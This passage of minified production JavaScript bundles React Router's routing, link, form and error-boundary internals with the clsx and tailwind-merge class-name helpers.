L=Cb(q&&q.map(H=>Object.assign({},H,{params:Object.assign({},x,H.params),pathname:Bt([g,r.encodeLocation?r.encodeLocation(H.pathname.replace(/%/g,"%25").replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:H.pathname]),pathnameBase:H.pathnameBase==="/"?g:Bt([g,r.encodeLocation?r.encodeLocation(H.pathnameBase.replace(/%/g,"%25").replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:H.pathnameBase])})),f,d);return u&&L?N.createElement(ss.Provider,{value:{location:{pathname:"/",search:"",hash:"",state:null,key:"default",mask:void 0,...A},navigationType:"POP"}},L):L}function Tb(){let o=_b(),u=rb(o)?`${o.status} ${o.statusText}`:o instanceof Error?o.message:JSON.stringify(o),d=o instanceof Error?o.stack:null,r="rgba(200,200,200, 0.5)",f={padding:"0.5rem",backgroundColor:r},p={padding:"2px 4px",backgroundColor:r},x=null;return console.error("Error handled by React Router default ErrorBoundary:",o),x=N.createElement(N.Fragment,null,N.createElement("p",null,"💿 Hey developer 👋"),N.createElement("p",null,"You can provide a way better UX than this when your app throws errors by providing your own ",N.createElement("code",{style:p},"ErrorBoundary")," or"," ",N.createElement("code",{style:p},"errorElement")," prop on your route.")),N.createElement(N.Fragment,null,N.createElement("h2",null,"Unexpected Application Error!"),N.createElement("h3",{style:{fontStyle:"italic"}},u),d?N.createElement("pre",{style:f},d):null,x)}var Eb=N.createElement(Tb,null),Ap=class extends N.Component{constructor(o){super(o),this.state={location:o.location,revalidation:o.revalidation,error:o.error}}static getDerivedStateFromError(o){return{error:o}}static getDerivedStateFromProps(o,u){return u.location!==o.location||u.revalidation!=="idle"&&o.revalidation==="idle"?{error:o.error,location:o.location,revalidation:o.revalidation}:{error:o.error!==void 0?o.error:u.error,location:u.location,revalidation:o.revalidation||u.revalidation}}componentDidCatch(o,u){this.props.onError?this.props.onError(o,u):console.error("React Router caught the following error during render",o)}render(){let o=this.state.error;if(this.context&&typeof o=="object"&&o&&"digest"in o&&typeof o.digest=="string"){const d=xb(o.digest);d&&(o=d)}let u=o!==void 0?N.createElement(Qt.Provider,{value:this.props.routeContext},N.createElement(Sc.Provider,{value:o,children:this.props.component})):this.props.children;return this.context?N.createElement(Nb,{error:o},u):u}};Ap.contextType=gp;var cc=new WeakMap;function Nb({children:o,error:u}){let{basename:d}=N.useContext(kt);if(typeof u=="object"&&u&&"digest"in u&&typeof u.digest=="string"){let r=gb(u.digest);if(r){let f=cc.get(u);if(f)throw f;let p=pp(r.location,d);if(hp&&!cc.get(u))if(p.isExternal||r.reloadDocument)window.location.href=p.absoluteURL||p.to;else{const x=Promise.resolve().then(()=>window.__reactRouterDataRouter.navigate(p.to,{replace:r.replace}));throw cc.set(u,x),x}return N.createElement("meta",{httpEquiv:"refresh",content:`0;url=${p.absoluteURL||p.to}`})}}return o}function jb({routeContext:o,match:u,children:d}){let r=N.useContext(ln);return r&&r.static&&r.staticContext&&(u.route.errorElement||u.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=u.route.id),N.createElement(Qt.Provider,{value:o},d)}function Cb(o,u=[],d){let r=d?.state;if(o==null){if(!r)return null;if(r.errors)o=r.matches;else if(u.length===0&&!r.initialized&&r.matches.length>0)o=r.matches;else return null}let f=o,p=r?.errors;if(p!=null){let T=f.findIndex(A=>A.route.id&&p?.[A.route.id]!==void 0);ke(T>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(p).join(",")}`),f=f.slice(0,Math.min(f.length,T+1))}let x=!1,v=-1;if(d&&r){x=r.renderFallback;for(let T=0;T<f.length;T++){let A=f[T];if((A.route.HydrateFallback||A.route.hydrateFallbackElement)&&(v=T),A.route.id){let{loaderData:z,errors:V}=r,q=A.route.loader&&!z.hasOwnProperty(A.route.id)&&(!V||V[A.route.id]===void 0);if(A.route.lazy||q){d.isStatic&&(x=!0),v>=0?f=f.slice(0,v+1):f=[f[0]];break}}}}let g=d?.onError,m=r&&g?(T,A)=>{g(T,{location:r.location,params:r.matches?.[0]?.params??{},pattern:cb(r.matches),errorInfo:A})}:void 0;return f.reduceRight((T,A,z)=>{let V,q=!1,L=null,H=null;r&&(V=p&&A.route.id?p[A.route.id]:void 0,L=A.route.errorElement||Eb,x&&(v<0&&z===0?(Tp("route-fallback",!1,"No `HydrateFallback` element provided to render during initial hydration"),q=!0,H=null):v===z&&(q=!0,H=A.route.hydrateFallbackElement||null)));let Z=u.concat(f.slice(0,z+1)),I=()=>{let J;return V?J=L:q?J=H:A.route.Component?J=N.createElement(A.route.Component,null):A.route.element?J=A.route.element:J=T,N.createElement(jb,{match:A,routeContext:{outlet:T,matches:Z,isDataRoute:r!=null},children:J})};return r&&(A.route.ErrorBoundary||A.route.errorElement||z===0)?N.createElement(Ap,{location:r.location,revalidation:r.revalidation,component:L,error:V,children:I(),routeContext:{outlet:null,matches:Z,isDataRoute:!0},onError:m}):I()},null)}function Ac(o){return`${o} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function wb(o){let u=N.useContext(ln);return ke(u,Ac(o)),u}function Rb(o){let u=N.useContext(Ho);return ke(u,Ac(o)),u}function Mb(o){let u=N.useContext(Qt);return ke(u,Ac(o)),u}function Tc(o){let u=Mb(o),d=u.matches[u.matches.length-1];return ke(d.route.id,`${o} can only be used on routes that contain a unique "id"`),d.route.id}function Db(){return Tc("useRouteId")}function _b(){let o=N.useContext(Sc),u=Rb("useRouteError"),d=Tc("useRouteError");return o!==void 0?o:u.errors?.[d]}function zb(){let{router:o}=wb("useNavigate"),u=Tc("useNavigate"),d=N.useRef(!1);return yp(()=>{d.current=!0}),N.useCallback(async(f,p={})=>{Gt(d.current,vp),d.current&&(typeof f=="number"?await o.navigate(f):await o.navigate(f,{fromRouteId:u,...p}))},[o,u])}var Kh={};function Tp(o,u,d){!u&&!Kh[o]&&(Kh[o]=!0,Gt(!1,d))}N.memo(Ob);function Ob({routes:o,manifest:u,future:d,state:r,isStatic:f,onError:p}){return Sp(o,void 0,{manifest:u,state:r,isStatic:f,onError:p})}function hl(o){ke(!1,"A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")}function kb({basename:o="/",children:u=null,location:d,navigationType:r="POP",navigator:f,static:p=!1,useTransitions:x}){ke(!os(),"You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");let v=o.replace(/^\/*/,"/"),g=N.useMemo(()=>({basename:v,navigator:f,static:p,useTransitions:x,future:{}}),[v,f,p,x]);typeof d=="string"&&(d=ga(d));let{pathname:m="/",search:T="",hash:A="",state:z=null,key:V="default",mask:q}=d,L=N.useMemo(()=>{let H=gl(m,v);return H==null?null:{location:{pathname:H,search:T,hash:A,state:z,key:V,mask:q},navigationType:r}},[v,m,T,A,z,V,r,q]);return Gt(L!=null,`<Router basename="${v}"> is not able to match the URL "${m}${T}${A}" because it does not start with the basename, so the <Router> won't render anything.`),L==null?null:N.createElement(kt.Provider,{value:g},N.createElement(ss.Provider,{children:u,value:L}))}function Hb({children:o,location:u}){return Ab(mc(o),u)}function mc(o,u=[]){let d=[];return N.Children.forEach(o,(r,f)=>{if(!N.isValidElement(r))return;let p=[...u,f];if(r.type===N.Fragment){d.push.apply(d,mc(r.props.children,p));return}ke(r.type===hl,`[${typeof r.type=="string"?r.type:r.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),ke(!r.props.index||!r.props.children,"An index route cannot have child routes.");let x={id:r.props.id||p.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,middleware:r.props.middleware,loader:r.props.loader,action:r.props.action,hydrateFallbackElement:r.props.hydrateFallbackElement,HydrateFallback:r.props.HydrateFallback,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.hasErrorBoundary===!0||r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(x.children=mc(r.props.children,p)),d.push(x)}),d}var Mo="get",Do="application/x-www-form-urlencoded";function Lo(o){return typeof HTMLElement<"u"&&o instanceof HTMLElement}function Lb(o){return Lo(o)&&o.tagName.toLowerCase()==="button"}function Ub(o){return Lo(o)&&o.tagName.toLowerCase()==="form"}function Bb(o){return Lo(o)&&o.tagName.toLowerCase()==="input"}function Gb(o){return!!(o.metaKey||o.altKey||o.ctrlKey||o.shiftKey)}function qb(o,u){return o.button===0&&(!u||u==="_self")&&!Gb(o)}var Co=null;function Yb(){if(Co===null)try{new FormData(document.createElement("form"),0),Co=!1}catch{Co=!0}return Co}var Vb=new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);function uc(o){return o!=null&&!Vb.has(o)?(Gt(!1,`"${o}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Do}"`),null):o}function Pb(o,u){let d,r,f,p,x;if(Ub(o)){let v=o.getAttribute("action");r=v?gl(v,u):null,d=o.getAttribute("method")||Mo,f=uc(o.getAttribute("enctype"))||Do,p=new FormData(o)}else if(Lb(o)||Bb(o)&&(o.type==="submit"||o.type==="image")){let v=o.form;if(v==null)throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');let g=o.getAttribute("formaction")||v.getAttribute("action");if(r=g?gl(g,u):null,d=o.getAttribute("formmethod")||v.getAttribute("method")||Mo,f=uc(o.getAttribute("formenctype"))||uc(v.getAttribute("enctype"))||Do,p=new FormData(v,o),!Yb()){let{name:m,type:T,value:A}=o;if(T==="image"){let z=m?`${m}.`:"";p.append(`${z}x`,"0"),p.append(`${z}y`,"0")}else m&&p.append(m,A)}}else{if(Lo(o))throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');d=Mo,r=null,f=Do,x=o}return p&&f==="text/plain"&&(x=p,p=void 0),{action:r,method:d.toLowerCase(),encType:f,formData:p,body:x}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");function Ec(o,u){if(o===!1||o===null||typeof o>"u")throw new Error(u)}function Ep(o,u,d,r){let f=typeof o=="string"?new URL(o,typeof window>"u"?"server://singlefetch/":window.location.origin):o;return d?f.pathname.endsWith("/")?f.pathname=`${f.pathname}_.${r}`:f.pathname=`${f.pathname}.${r}`:f.pathname==="/"?f.pathname=`_root.${r}`:u&&gl(f.pathname,u)==="/"?f.pathname=`${zo(u)}/_root.${r}`:f.pathname=`${zo(f.pathname)}.${r}`,f}async function Xb(o,u){if(o.id in u)return u[o.id];try{let d=await import(o.module);return u[o.id]=d,d}catch(d){return console.error(`Error loading route module \`${o.module}\`, reloading page...`),console.error(d),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function Qb(o){return o==null?!1:o.href==null?o.rel==="preload"&&typeof o.imageSrcSet=="string"&&typeof o.imageSizes=="string":typeof o.rel=="string"&&typeof o.href=="string"}async function Kb(o,u,d){let r=await Promise.all(o.map(async f=>{let p=u.routes[f.route.id];if(p){let x=await Xb(p,d);return x.links?x.links():[]}return[]}));return Fb(r.flat(1).filter(Qb).filter(f=>f.rel==="stylesheet"||f.rel==="preload").map(f=>f.rel==="stylesheet"?{...f,rel:"prefetch",as:"style"}:{...f,rel:"prefetch"}))}function Zh(o,u,d,r,f,p){let x=(g,m)=>d[m]?g.route.id!==d[m].route.id:!0,v=(g,m)=>d[m].pathname!==g.pathname||d[m].route.path?.endsWith("*")&&d[m].params["*"]!==g.params["*"];return p==="assets"?u.filter((g,m)=>x(g,m)||v(g,m)):p==="data"?u.filter((g,m)=>{let T=r.routes[g.route.id];if(!T||!T.hasLoader)return!1;if(x(g,m)||v(g,m))return!0;if(g.route.shouldRevalidate){let A=g.route.shouldRevalidate({currentUrl:new URL(f.pathname+f.search+f.hash,window.origin),currentParams:d[0]?.params||{},nextUrl:new URL(o,window.origin),nextParams:g.params,defaultShouldRevalidate:!0});if(typeof A=="boolean")return A}return!0}):[]}function Zb(o,u,{includeHydrateFallback:d}={}){return Jb(o.map(r=>{let f=u.routes[r.route.id];if(!f)return[];let p=[f.module];return f.clientActionModule&&(p=p.concat(f.clientActionModule)),f.clientLoaderModule&&(p=p.concat(f.clientLoaderModule)),d&&f.hydrateFallbackModule&&(p=p.concat(f.hydrateFallbackModule)),f.imports&&(p=p.concat(f.imports)),p}).flat(1))}function Jb(o){return[...new Set(o)]}function Wb(o){let u={},d=Object.keys(o).sort();for(let r of d)u[r]=o[r];return u}function Fb(o,u){let d=new Set;return new Set(u),o.reduce((r,f)=>{let p=JSON.stringify(Wb(f));return d.has(p)||(d.add(p),r.push({key:p,link:f})),r},[])}function Nc(){let o=N.useContext(ln);return Ec(o,"You must render this element inside a <DataRouterContext.Provider> element"),o}function Ib(){let o=N.useContext(Ho);return Ec(o,"You must render this element inside a <DataRouterStateContext.Provider> element"),o}var jc=N.createContext(void 0);jc.displayName="FrameworkContext";function Cc(){let o=N.useContext(jc);return Ec(o,"You must render this element inside a <HydratedRouter> element"),o}function $b(o,u){let d=N.useContext(jc),[r,f]=N.useState(!1),[p,x]=N.useState(!1),{onFocus:v,onBlur:g,onMouseEnter:m,onMouseLeave:T,onTouchStart:A}=u,z=N.useRef(null);N.useEffect(()=>{if(o==="render"&&x(!0),o==="viewport"){let L=Z=>{Z.forEach(I=>{x(I.isIntersecting)})},H=new IntersectionObserver(L,{threshold:.5});return z.current&&H.observe(z.current),()=>{H.disconnect()}}},[o]),N.useEffect(()=>{if(r){let L=setTimeout(()=>{x(!0)},100);return()=>{clearTimeout(L)}}},[r]);let V=()=>{f(!0)},q=()=>{f(!1),x(!1)};return d?o!=="intent"?[p,z,{}]:[p,z,{onFocus:es(v,V),onBlur:es(g,q),onMouseEnter:es(m,V),onMouseLeave:es(T,q),onTouchStart:es(A,V)}]:[!1,z,{}]}function es(o,u){return d=>{o&&o(d),d.defaultPrevented||u(d)}}function e1({page:o,...u}){let d=db(),{router:r}=Nc(),f=N.useMemo(()=>rp(r.routes,o,r.basename),[r.routes,o,r.basename]);return f?d?N.createElement(l1,{page:o,matches:f,...u}):N.createElement(a1,{page:o,matches:f,...u}):null}function t1(o){let{manifest:u,routeModules:d}=Cc(),[r,f]=N.useState([]);return N.useEffect(()=>{let p=!1;return Kb(o,u,d).then(x=>{p||f(x)}),()=>{p=!0}},[o,u,d]),r}function l1({page:o,matches:u,...d}){let r=Kt(),{future:f}=Cc(),{basename:p}=Nc(),x=N.useMemo(()=>{if(o===r.pathname+r.search+r.hash)return[];let v=Ep(o,p,f.v8_trailingSlashAwareDataRequests,"rsc"),g=!1,m=[];for(let T of u)typeof T.route.shouldRevalidate=="function"?g=!0:m.push(T.route.id);return g&&m.length>0&&v.searchParams.set("_routes",m.join(",")),[v.pathname+v.search]},[p,f.v8_trailingSlashAwareDataRequests,o,r,u]);return N.createElement(N.Fragment,null,x.map(v=>N.createElement("link",{key:v,rel:"prefetch",as:"fetch",href:v,...d})))}function a1({page:o,matches:u,...d}){let r=Kt(),{future:f,manifest:p,routeModules:x}=Cc(),{basename:v}=Nc(),{loaderData:g,matches:m}=Ib(),T=N.useMemo(()=>Zh(o,u,m,p,r,"data"),[o,u,m,p,r]),A=N.useMemo(()=>Zh(o,u,m,p,r,"assets"),[o,u,m,p,r]),z=N.useMemo(()=>{if(o===r.pathname+r.search+r.hash)return[];let L=new Set,H=!1;if(u.forEach(I=>{let J=p.routes[I.route.id];!J||!J.hasLoader||(!T.some(se=>se.route.id===I.route.id)&&I.route.id in g&&x[I.route.id]?.shouldRevalidate||J.hasClientLoader?H=!0:L.add(I.route.id))}),L.size===0)return[];let Z=Ep(o,v,f.v8_trailingSlashAwareDataRequests,"data");return H&&L.size>0&&Z.searchParams.set("_routes",u.filter(I=>L.has(I.route.id)).map(I=>I.route.id).join(",")),[Z.pathname+Z.search]},[v,f.v8_trailingSlashAwareDataRequests,g,r,p,T,u,o,x]),V=N.useMemo(()=>Zb(A,p),[A,p]),q=t1(A);return N.createElement(N.Fragment,null,z.map(L=>N.createElement("link",{key:L,rel:"prefetch",as:"fetch",href:L,...d})),V.map(L=>N.createElement("link",{key:L,rel:"modulepreload",href:L,...d})),q.map(({key:L,link:H})=>N.createElement("link",{key:L,nonce:d.nonce,...H,crossOrigin:H.crossOrigin??d.crossOrigin})))}function n1(...o){return u=>{o.forEach(d=>{typeof d=="function"?d(u):d!=null&&(d.current=u)})}}var s1=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";try{s1&&(window.__reactRouterVersion="7.17.0")}catch{}function o1({basename:o,children:u,useTransitions:d,window:r}){let f=N.useRef();f.current==null&&(f.current=Lx({window:r,v5Compat:!0}));let p=f.current,[x,v]=N.useState({action:p.action,location:p.location}),g=N.useCallback(m=>{d===!1?v(m):N.startTransition(()=>v(m))},[d]);return N.useLayoutEffect(()=>p.listen(g),[p,g]),N.createElement(kb,{basename:o,children:u,location:x.location,navigationType:x.action,navigator:p,useTransitions:d})}var Np=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,at=N.forwardRef(function({onClick:u,discover:d="render",prefetch:r="none",relative:f,reloadDocument:p,replace:x,mask:v,state:g,target:m,to:T,preventScrollReset:A,viewTransition:z,defaultShouldRevalidate:V,...q},L){let{basename:H,navigator:Z,useTransitions:I}=N.useContext(kt),J=typeof T=="string"&&Np.test(T),se=pp(T,H);T=se.to;let ee=bb(T,{relative:f}),ue=Kt(),F=null;if(v){let we=yc(v,[],ue.mask?ue.mask.pathname:"/",!0);H!=="/"&&(we.pathname=we.pathname==="/"?H:Bt([H,we.pathname])),F=Z.createHref(we)}let[P,Ee,ht]=$b(r,q),nt=u1(T,{replace:x,mask:v,state:g,target:m,preventScrollReset:A,relative:f,viewTransition:z,defaultShouldRevalidate:V,useTransitions:I});function Ue(we){u&&u(we),we.defaultPrevented||nt(we)}let pt=!(se.isExternal||p),tt=N.createElement("a",{...q,...ht,href:(pt?F:void 0)||se.absoluteURL||ee,onClick:pt?Ue:u,ref:n1(L,Ee),target:m,"data-discover":!J&&d==="render"?"true":void 0});return P&&!J?N.createElement(N.Fragment,null,tt,N.createElement(e1,{page:ee})):tt});at.displayName="Link";var i1=N.forwardRef(function({"aria-current":u="page",caseSensitive:d=!1,className:r="",end:f=!1,style:p,to:x,viewTransition:v,children:g,...m},T){let A=is(x,{relative:m.relative}),z=Kt(),V=N.useContext(Ho),{navigator:q,basename:L}=N.useContext(kt),H=V!=null&&m1(A)&&v===!0,Z=q.encodeLocation?q.encodeLocation(A).pathname:A.pathname,I=z.pathname,J=V&&V.navigation&&V.navigation.location?V.navigation.location.pathname:null;d||(I=I.toLowerCase(),J=J?J.toLowerCase():null,Z=Z.toLowerCase()),J&&L&&(J=gl(J,L)||J);const se=Z!=="/"&&Z.endsWith("/")?Z.length-1:Z.length;let ee=I===Z||!f&&I.startsWith(Z)&&I.charAt(se)==="/",ue=J!=null&&(J===Z||!f&&J.startsWith(Z)&&J.charAt(Z.length)==="/"),F={isActive:ee,isPending:ue,isTransitioning:H},P=ee?u:void 0,Ee;typeof r=="function"?Ee=r(F):Ee=[r,ee?"active":null,ue?"pending":null,H?"transitioning":null].filter(Boolean).join(" ");let ht=typeof p=="function"?p(F):p;return N.createElement(at,{...m,"aria-current":P,className:Ee,ref:T,style:ht,to:x,viewTransition:v},typeof g=="function"?g(F):g)});i1.displayName="NavLink";var r1=N.forwardRef(({discover:o="render",fetcherKey:u,navigate:d,reloadDocument:r,replace:f,state:p,method:x=Mo,action:v,onSubmit:g,relative:m,preventScrollReset:T,viewTransition:A,defaultShouldRevalidate:z,...V},q)=>{let{useTransitions:L}=N.useContext(kt),H=h1(),Z=p1(v,{relative:m}),I=x.toLowerCase()==="get"?"get":"post",J=typeof v=="string"&&Np.test(v),se=ee=>{if(g&&g(ee),ee.defaultPrevented)return;ee.preventDefault();let ue=ee.nativeEvent.submitter,F=ue?.getAttribute("formmethod")||x,P=()=>H(ue||ee.currentTarget,{fetcherKey:u,method:F,navigate:d,replace:f,state:p,relative:m,preventScrollReset:T,viewTransition:A,defaultShouldRevalidate:z});L&&d!==!1?N.startTransition(()=>P()):P()};return N.createElement("form",{ref:q,method:I,action:Z,onSubmit:r?g:se,...V,"data-discover":!J&&o==="render"?"true":void 0})});r1.displayName="Form";function c1(o){return`${o} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function jp(o){let u=N.useContext(ln);return ke(u,c1(o)),u}function u1(o,{target:u,replace:d,mask:r,state:f,preventScrollReset:p,relative:x,viewTransition:v,defaultShouldRevalidate:g,useTransitions:m}={}){let T=vb(),A=Kt(),z=is(o,{relative:x});return N.useCallback(V=>{if(qb(V,u)){V.preventDefault();let q=d!==void 0?d:as(A)===as(z),L=()=>T(o,{replace:q,mask:r,state:f,preventScrollReset:p,relative:x,viewTransition:v,defaultShouldRevalidate:g});m?N.startTransition(()=>L()):L()}},[A,T,z,d,r,f,u,o,p,x,v,g,m])}var d1=0,f1=()=>`__${String(++d1)}__`;function h1(){let{router:o}=jp("useSubmit"),{basename:u}=N.useContext(kt),d=Db(),r=o.fetch,f=o.navigate;return N.useCallback(async(p,x={})=>{let{action:v,method:g,encType:m,formData:T,body:A}=Pb(p,u);if(x.navigate===!1){let z=x.fetcherKey||f1();await r(z,d,x.action||v,{defaultShouldRevalidate:x.defaultShouldRevalidate,preventScrollReset:x.preventScrollReset,formData:T,body:A,formMethod:x.method||g,formEncType:x.encType||m,flushSync:x.flushSync})}else await f(x.action||v,{defaultShouldRevalidate:x.defaultShouldRevalidate,preventScrollReset:x.preventScrollReset,formData:T,body:A,formMethod:x.method||g,formEncType:x.encType||m,replace:x.replace,state:x.state,fromRouteId:d,flushSync:x.flushSync,viewTransition:x.viewTransition})},[r,f,u,d])}function p1(o,{relative:u}={}){let{basename:d}=N.useContext(kt),r=N.useContext(Qt);ke(r,"useFormAction must be used inside a RouteContext");let[f]=r.matches.slice(-1),p={...is(o||".",{relative:u})},x=Kt();if(o==null){p.search=x.search;let v=new URLSearchParams(p.search),g=v.getAll("index");if(g.some(T=>T==="")){v.delete("index"),g.filter(A=>A).forEach(A=>v.append("index",A));let T=v.toString();p.search=T?`?${T}`:""}}return(!o||o===".")&&f.route.index&&(p.search=p.search?p.search.replace(/^\?/,"?index&"):"?index"),d!=="/"&&(p.pathname=p.pathname==="/"?d:Bt([d,p.pathname])),as(p)}function m1(o,{relative:u}={}){let d=N.useContext(xp);ke(d!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:r}=jp("useViewTransitionState"),f=is(o,{relative:u});if(!d.isTransitioning)return!1;let p=gl(d.currentLocation.pathname,r)||d.currentLocation.pathname,x=gl(d.nextLocation.pathname,r)||d.nextLocation.pathname;return _o(f.pathname,x)!=null||_o(f.pathname,p)!=null}function Cp(o){var u,d,r="";if(typeof o=="string"||typeof o=="number")r+=o;else if(typeof o=="object")if(Array.isArray(o)){var f=o.length;for(u=0;u<f;u++)o[u]&&(d=Cp(o[u]))&&(r&&(r+=" "),r+=d)}else for(d in o)o[d]&&(r&&(r+=" "),r+=d);return r}function wp(){for(var o,u,d=0,r="",f=arguments.length;d<f;d++)(o=arguments[d])&&(u=Cp(o))&&(r&&(r+=" "),r+=u);return r}const g1=(o,u)=>{const d=new Array(o.length+u.length);for(let r=0;r<o.length;r++)d[r]=o[r];for(let r=0;r<u.length;r++)d[o.length+r]=u[r];return d},x1=(o,u)=>({classGroupId:o,validator:u}),Rp=(o=new Map,u=null,d)=>({nextPart:o,validators:u,classGroupId:d}),Oo="-",Jh=[],b1="arbitrary..",v1=o=>{const u=S1(o),{conflictingClassGroups:d,conflictingClassGroupModifiers:r}=o;return{getClassGroupId:x=>{if(x.startsWith("[")&&x.endsWith("]"))return y1(x);const v=x.split(Oo),g=v[0]===""&&v.length>1?1:0;return Mp(v,g,u)},getConflictingClassGroupIds:(x,v)=>{if(v){const g=r[x],m=d[x];return g?m?g1(m,g):g:m||Jh}return d[x]||Jh}}},Mp=(o,u,d)=>{if(o.length-u===0)return d.classGroupId;const f=o[u],p=d.nextPart.get(f);if(p){const m=Mp(o,u+1,p);if(m)return m}const x=d.validators;if(x===null)return;const v=u===0?o.join(Oo):o.slice(u).join(Oo),g=x.length;for(let m=0;m<g;m++){const T=x[m];if(T.validator(v))return T.classGroupId}},y1=o=>o.slice(1,-1).indexOf(":")===-1?void 0:(()=>{const u=o.slice(1,-1),d=u.indexOf(":"),r=u.slice(0,d);return r?b1+r:void 0})(),S1=o=>{const{theme:u,classGroups:d}=o;return A1(d,u)},A1=(o,u)=>{const d=Rp();for(const r in o){const f=o[r];wc(f,d,r,u)}return d},wc=(o,u,d,r)=>{const f=o.length;for(let p=0;p<f;p++){const x=o[p];T1(x,u,d,r)}},T1=(o,u,d,r)=>{if(typeof o=="string"){E1(o,u,d);return}if(typeof o=="function"){N1(o,u,d,r);return}j1(o,u,d,r)},E1=(o,u,d)=>{const r=o===""?u:Dp(u,o);r.classGroupId=d},N1=(o,u,d,r)=>{if(C1(o)){wc(o(r),u,d,r);return}u.validators===null&&(u.validators=[]),u.validators.push(x1(d,o))},j1=(o,u,d,r)=>{const f=Object.entries(o),p=f.length;for(let x=0;x<p;x++){const[v,g]=f[x];wc(g,Dp(u,v),d,r)}},Dp=(o,u)=>{let d=o;const r=u.split(Oo),f=r.length;for(let p=0;p<f;p++){const x=r[p];let v=d.nextPart.get(x);v||(v=Rp(),d.nextPart.set(x,v)),d=v}return d},C1=o=>"isThemeGetter"in o&&o.isThemeGetter===!0,w1=o=>{if(o<1)return{get:()=>{},set:()=>{}};let u=0,d=Object.create(null),r=Object.create(null);const f=(p,x)=>{d[p]=x,u++,u>o&&(u=0,r=d,d=Object.create(null))};return{get(p){let x=d[p];if(x!==void 0)return x;if((x=r[p])!==void 0)return f(p,x),x},set(p,x){p in d?d[p]=x:f(p,x)}}},gc="!",Wh=":",R1=[],Fh=(o,u,d,r,f)=>({modifiers:o,hasImportantModifier:u,baseClassName:d,maybePostfixModifierPosition:r,isExternal:f}),M1=o=>{const{prefix:u,experimentalParseClassName:d}=o;let r=f=>{const p=[];let x=0,v=0,g=0,m;const T=f.length;for(let L=0;L<T;L++){const H=f[L];if(x===0&&v===0){if(H===Wh){p.push(f.slice(g,L)),g=L+1;continue}if(H==="/"){m=L;continue}}H==="["?x++:H==="]"?x--:H==="("?v++:H===")"&&v--}const A=p.length===0?f:f.slice(g);let z=A,V=!1;A.endsWith(gc)?(z=A.slice(0,-1),V=!0):A.startsWith(gc)&&(z=A.slice(1),V=!0);const q=m&&m>g?m-g:void 0;return Fh(p,V,z,q)};if(u){const f=u+Wh,p=r;r=x=>x.startsWith(f)?p(x.slice(f.length)):Fh(R1,!1,x,void 0,!0)}if(d){const f=r;r=p=>d({className:p,parseClassName:f})}return r},D1=o=>{const u=new Map;return o.orderSensitiveModifiers.forEach((d,r)=>{u.set(d,1e6+r)}),d=>{const r=[];let f=[];for(let p=0;p<d.length;p++){const x=d[p],v=x[0]==="[",g=u.has(x);v||g?(f.length>0&&(f.sort(),r.push(...f),f=[]),r.push(x)):f.push(x)}return f.length>0&&(f.sort(),r.push(...f)),r}},_1=o=>({cache:w1(o.cacheSize),parseClassName:M1(o),sortModifiers:D1(o),...v1(o)}),z1=/\s+/,O1=(o,u)=>{const{parseClassName:d,getClassGroupId:r,getConflictingClassGroupIds:f,sortModifiers:p}=u,x=[],v=o.trim().split(z1);let g="";for(let m=v.length-1;m>=0;m-=1){const T=v[m],{isExternal:A,modifiers:z,hasImportantModifier:V,baseClassName:q,maybePostfixModifierPosition:L}=d(T);if(A){g=T+(g.length>0?" "+g:g);continue}let H=!!L,Z=r(H?q.substring(0,L):q);if(!Z){if(!H){g=T+(g.length>0?" "+g:g);continue}if(Z=r(q),!Z){g=T+(g.length>0?" "+g:g);continue}H=!1}const I=z.length===0?"":z.length===1?z[0]:p(z).join(":"),J=V?I+gc:I,se=J+Z;if(x.indexOf(se)>-1)continue;x.push(se);const ee=f(Z,H);for(let ue=0;ue<ee.length;++ue){const F=ee[ue];x.push(J+F)}g=T+(g.length>0?" "+g:g)}return g},k1=(...o)=>{let u=0,d,r,f="";for(;u<o.length;)(d=o[u++])&&(r=_p(d))&&(f&&(f+=" "),f+=r);return f},_p=o=>{if(typeof o=="string")return o;let u,d="";for(let r=0;r<o.length;r++)o[r]&&(u=_p(o[r]))&&(d&&(d+=" "),d+=u);return d},H1=(o,...u)=>{let d,r,f,p;const x=g=>{const m=u.reduce((T,A)=>A(T),o());return d=_1(m),r=d.cache.get,f=d.cache.set,p=v,v(g)},v=g=>{const m=r(g);if(m)return m;const T=O1(g,d);return f(g,T),T};return p=x,(...g)=>p(k1(...g))},L1=[],Qe=o=>{const u=d=>d[o]||L1;return 